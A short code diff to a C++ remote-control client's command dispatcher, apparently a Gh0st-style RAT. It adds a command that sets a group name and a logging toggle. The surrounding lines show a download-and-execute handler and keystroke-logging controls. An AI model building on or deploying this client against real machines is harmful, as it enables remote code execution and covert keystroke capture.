@@ -489,6 +489,13 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
     std::string publicIP = m_ClientObject->GetClientIP();
 
     switch (szBuffer[0]) {
+    case CMD_SET_GROUP:{
+        std::string group = std::string((char*)szBuffer + 1);
+        iniFile cfg(CLIENT_PATH);
+        cfg.SetStr("settings", "group_name", group);
+        break;
+    }
+
     case COMMAND_DOWN_EXEC:
     {
         std::thread(DownExecute, std::string((char*)szBuffer + 1), this).detach();
@@ -708,6 +715,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
                 CKeyboardManager1* mgr = (CKeyboardManager1*)m_hKeyboard->user;
                 mgr->m_bIsOfflineRecord = TRUE;
             }
+            Logger::getInstance().usingLog(m_settings.EnableLog);
         }
         break;
     case COMMAND_KEYBOARD: { //键盘记录
